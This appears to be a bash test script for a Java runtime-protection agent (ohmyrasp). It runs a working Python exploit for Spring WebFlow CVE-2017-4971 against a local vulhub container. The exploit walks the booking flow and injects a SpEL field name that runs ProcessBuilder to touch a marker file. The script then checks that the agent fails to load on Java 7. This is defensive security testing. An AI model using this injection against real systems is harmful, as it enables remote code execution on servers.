#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

image="${OHMYRASP_VULHUB_SPRING_WEBFLOW_IMAGE:-vulhub/spring-webflow:2.4.4}"
baseline_name="${OHMYRASP_VULHUB_SPRING_WEBFLOW_BASELINE_NAME:-ohmyrasp-vulhub-spring4971-baseline}"
protected_name="${OHMYRASP_VULHUB_SPRING_WEBFLOW_PROTECTED_NAME:-ohmyrasp-vulhub-spring4971-protected}"
baseline_port="${OHMYRASP_VULHUB_SPRING_WEBFLOW_BASELINE_PORT:-19160}"
protected_port="${OHMYRASP_VULHUB_SPRING_WEBFLOW_PROTECTED_PORT:-19161}"
baseline_dir="logs/vulhub-spring-webflow-2.4.4-java7-baseline"
protected_dir="logs/vulhub-spring-webflow-2.4.4-java7-protected"
success_file="/tmp/ohmyrasp-spring4971-success"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

wait_for_home() {
  local name="$1"
  local port="$2"
  local output="$3"
  local status

  for _ in $(seq 1 180); do
    status="$(curl -sS -o "$output" -w "%{http_code}" \
      "http://127.0.0.1:${port}/" 2>/dev/null || true)"
    if [[ "$status" == "200" ]] && grep -q 'Spring Travel' "$output"; then
      return
    fi
    sleep 1
  done

  docker logs "$name" >&2 || true
  echo "${name} did not expose Spring WebFlow hotel application at ${port}" >&2
  exit 1
}

run_webflow_exploit() {
  local port="$1"
  local marker="$2"
  local output="$3"

  python3 - "$port" "$marker" "$output" <<'PY'
import http.cookiejar
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

port = sys.argv[1]
marker = sys.argv[2]
output = sys.argv[3]
base = f"http://127.0.0.1:{port}"
opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())
)
records = []


def request(path, data=None):
    url = path if path.startswith("http://") else base + path
    body = None
    headers = {}
    if data is not None:
        body = urllib.parse.urlencode(data).encode("utf-8")
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    req = urllib.request.Request(url, data=body, headers=headers)
    try:
        with opener.open(req, timeout=30) as response:
            status = response.status
            text = response.read().decode("ISO-8859-1", "replace")
            final_url = response.geturl()
    except urllib.error.HTTPError as error:
        status = error.code
        text = error.read().decode("ISO-8859-1", "replace")
        final_url = error.geturl()
    records.append(f"{status} {final_url}")
    return status, final_url, text


def first(pattern, text, label):
    match = re.search(pattern, text)
    if not match:
        raise RuntimeError(f"missing {label}")
    return match.group(1)


status, _, login = request("/login")
csrf = first(r'name="_csrf" value="([^"]+)"', login, "login csrf")
request(
    "/loginProcess",
    {
        "username": "keith",
        "password": "melbourne",
        "_csrf": csrf,
    },
)
status, _, booking = request("/hotels/booking?mode=embedded&hotelId=1")
proceed_action = first(r'<form id="booking" action="([^"]+)"', booking, "booking action")
proceed_csrf = first(r'name="_csrf" value="([^"]+)"', booking, "booking csrf")
checkin = first(r'name="checkinDate" value="([^"]+)"', booking, "checkinDate")
checkout = first(r'name="checkoutDate" value="([^"]+)"', booking, "checkoutDate")
status, _, review = request(
    proceed_action,
    {
        "checkinDate": checkin,
        "checkoutDate": checkout,
        "beds": "1",
        "smoking": "false",
        "creditCard": "4111111111111111",
        "creditCardName": "Keith",
        "creditCardExpiryMonth": "1",
        "creditCardExpiryYear": "5",
        "_eventId_proceed": "",
        "_csrf": proceed_csrf,
    },
)
confirm_action = first(r'<form id="confirm" action="([^"]+)"', review, "confirm action")
confirm_csrf = first(r'name="_csrf" value="([^"]+)"', review, "confirm csrf")
malicious_name = (
    '_(new java.lang.ProcessBuilder("touch","'
    + marker
    + '")).start()'
)
status, _, exploit = request(
    confirm_action,
    {
        "_eventId_confirm": "",
        "_csrf": confirm_csrf,
        malicious_name: "vulhub",
    },
)
with open(output, "w", encoding="utf-8") as handle:
    handle.write("\n".join(records))
    handle.write("\n\n")
    handle.write(exploit[:4000])
    handle.write("\n")
if status != 500 or "IllegalAccessError" not in exploit:
    raise SystemExit(1)
PY
}

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker run -d --name "$baseline_name" \
  -p "${baseline_port}:8080" \
  "$image" >/dev/null

wait_for_home "$baseline_name" "$baseline_port" "${baseline_dir}/home.response"
if ! run_webflow_exploit "$baseline_port" "$success_file" "${baseline_dir}/confirm-exploit.response"; then
  sed -n '1,180p' "${baseline_dir}/confirm-exploit.response" >&2 || true
  echo "baseline Spring WebFlow CVE-2017-4971 exploit flow failed" >&2
  exit 1
fi
if ! docker exec "$baseline_name" sh -c "test -e '${success_file}'"; then
  sed -n '1,180p' "${baseline_dir}/confirm-exploit.response" >&2 || true
  echo "baseline Spring WebFlow did not create ${success_file}" >&2
  exit 1
fi

docker run -d --name "$protected_name" \
  -p "${protected_port}:8080" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e "JAVA_TOOL_OPTIONS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "$image" >/dev/null

sleep 3
docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
if ! grep -q 'Unsupported major.minor version 52.0' "${protected_dir}/container.log"; then
  sed -n '1,160p' "${protected_dir}/container.log" >&2
  echo "Spring WebFlow Java 7 protected probe did not show Java 8 agent class-version mismatch" >&2
  exit 1
fi
if docker ps --filter "name=${protected_name}" --filter "status=running" --format '{{.Names}}' | grep -q .; then
  echo "Spring WebFlow Java 7 container unexpectedly kept running with Java 8 agent" >&2
  exit 1
fi

echo "vulhub Spring WebFlow CVE-2017-4971 Java7 legacy boundary passed"
